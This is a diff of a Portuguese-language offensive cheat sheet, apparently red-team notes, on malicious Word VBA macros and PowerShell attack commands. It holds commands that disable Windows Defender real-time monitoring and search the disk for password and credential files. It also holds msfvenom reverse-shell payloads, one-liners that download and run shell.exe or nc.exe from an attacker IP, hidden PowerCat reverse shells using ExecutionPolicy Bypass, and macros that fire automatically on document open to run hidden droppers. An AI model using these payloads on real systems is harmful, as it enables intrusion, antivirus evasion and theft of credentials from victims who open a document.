@@ -1,6 +1,127 @@
 # Word VBA Macro
 
-## Exibir alerta na tela
+## Comandos Básicos
+### Desabilitar Windows Defender Real Time
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+ou
+```
+Set-MpPreference -DisableRealtimeMonitoring 1
+```
+### Habilitar Windows Defender Real Time
+```
+Set-MpPreference -DisableRealtimeMonitoring $false
+```
+ou
+```
+Set-MpPreference -DisableRealtimeMonitoring 0
+```
+### Downloader
+```
+Invoke-WebRequest -uri https://google.com.br/robots.txt -OutFile robots.txt
+```
+### Pesquisa por arquivos interessantes
+```
+gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue
+```
+### Históricos de comandos do PowerShell
+```
+Get-History
+```
+### Localizar arquivo de registro do histórico de comandos do PowerShell
+```
+Get-PSReadLineOption
+```
+```
+(Get-PSReadLineOption).HistorySavePath
+```
+### PowerShell Dropper
+### Kali Linux
+```
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.118 LPORT=4444 -f exe -o shell.exe
+$ nc -nlvp 4444
+$ python -m http.server 80
+```
+### Windows
+```
+$url = "http://192.168.2.118/shell.exe" 
+```
+```
+$out = "shell.exe" 
+```
+```
+$wc = New-Object Net.WebClient 
+```
+```
+$wc.DownloadFile($url, $out)
+```
+```
+.\shell.exe
+```
+### PowerShell Dropper OneLiner
+```
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/shell.exe', 'shell.exe');.\shell.exe
+```
+```
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/nc.exe', 'nc.exe');.\nc.exe 192.168.2.118 4444 -e cmd
+```
+### PowerShell Execute Remote Script by IEX - powershell "IEX(New-Object System.Net.WebClient).DownloadString('URL')"
+```
+powershell "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/thiagosmith/scripts-powershell/refs/heads/main/info.ps1')"
+```
+Kali Linux
+```
+$ cat smith
+whoami
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/smith')desktop-7e8sqov\admin
+```
+### PowerShell Dropper OneLine com IEX
+Kali Linux
+```
+$ cat dropper
+$url = "http://192.168.2.118/shell.exe"
+$out = "shell.exe"
+$wc = New-Object Net.WebClient
+$wc.DownloadFile($url, $out)
+.\shell.exe
+```
+Windows
+```
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/dropper')
+```
+Kali Linux
+```
+$ cat dropper1
+$url = "http://192.168.2.118/nc.exe"
+$out = "nc.exe"
+$wc = New-Object Net.WebClient
+$wc.DownloadFile($url, $out)
+.\nc.exe 192.168.2.118 4444 -e cmd
+```
+Windows
+```
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/dropper1')
+```
+### PowerCat com IEX
+```
+.\nc.exe -nlvp 8000
+```
+```
+powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
+```
+### lnk File with PowerCat
+```
+powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
+```
+```
+powershell.exe -ExecutionPolicy Bypass -noLogo -w hidden -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
+```
+
+## VBA com Powershell em Macros
+### Exibir alerta na tela
 ```
 Sub Document_Open()
     RedScan
@@ -13,7 +134,7 @@ Sub RedScan()
 End Sub
 ```
 
-## Abrir arquivo
+### Abrir aplicação
 ```
 Sub Document_Open()
     RedScan
@@ -28,7 +149,7 @@ Sub RedScan()
 End Sub
 ```
 
-## Abrir o CMD
+### Abrir o CMD
 ```
 Sub Document_Open()
     RedScan
@@ -58,8 +179,32 @@ Sub RedScan()
     Shell str, vbHide
 End Sub
 ```
+### CMD
+```
+Sub AutoOpen()
+  RedScan
+End Sub
+Sub Document_Open()
+  RedScan
+End Sub
+Sub RedScan()
+  CreateObject("Wscript.Shell").Run "cmd"
+End Sub
+```
 
-## Executa um comando com saída na msgbox
+### PowerShell
+```
+Sub AutoOpen()
+  RedScan
+End Sub
+Sub Document_Open()
+  RedScan
+End Sub
+Sub RedScan()
+  CreateObject("Wscript.Shell").Run "powershell"
+End Sub
+```
+### Executa um comando com saída na msgbox
 ```
 Sub Document_Open()
     RedScan
@@ -83,32 +228,7 @@ Sub RedScan()
 End Sub
 ```
 
-## PowerShell Dropper
-```
-Sub Document_Open()
-    RedScan
-End Sub
-Sub AutoOpen()
-    RedScan
-End Sub
-Sub RedScan()
-    Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
-    Shell str, vbHide
-    Dim exePath As String
-    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
-    Wait (2)
-    Shell exePath, vbHide
-End Sub
-Sub Wait(n As Long)
-    Dim t As Date
-    t = Now
-    Do
-        DoEvents
-    Loop Until Now >= DateAdd("s", n, t)
-End Sub
-```
-
+### PowerShell Dropper
 ```
 Sub Document_Open()
     RedScan
@@ -138,7 +258,7 @@ Sub Wait(n As Long)
 End Sub
 ```
 
-## PowerShell Dropper1
+### PowerShell Dropper1
 ```
 Sub Document_Open()
     RedScan
@@ -165,7 +285,7 @@ End Sub
 ```
 
 
-## Executa um comando com saída na msgbox
+### Executa um comando com saída na msgbox
 ```
 Sub Document_Open()
     RedScan
@@ -189,7 +309,7 @@ Sub RedScan()
 End Sub
 ```
 
-## Executar comando e salvar resposta em arquivo de texto
+### Executar comando e salvar resposta em arquivo de texto
 ```
 Sub RedScan()
     Dim objShell As Object, objExec As Object, strLine As String
@@ -211,31 +331,7 @@ Sub RedScan()
 End Sub
 ```
 
-## CMD
-```
-Sub AutoOpen()
-  RedScan
-End Sub
-Sub Document_Open()
-  RedScan
-End Sub
-Sub RedScan()
-  CreateObject("Wscript.Shell").Run "cmd"
-End Sub
-```
 
-## PowerShell
-```
-Sub AutoOpen()
-  RedScan
-End Sub
-Sub Document_Open()
-  RedScan
-End Sub
-Sub RedScan()
-  CreateObject("Wscript.Shell").Run "powershell"
-End Sub
-```
 
 
 
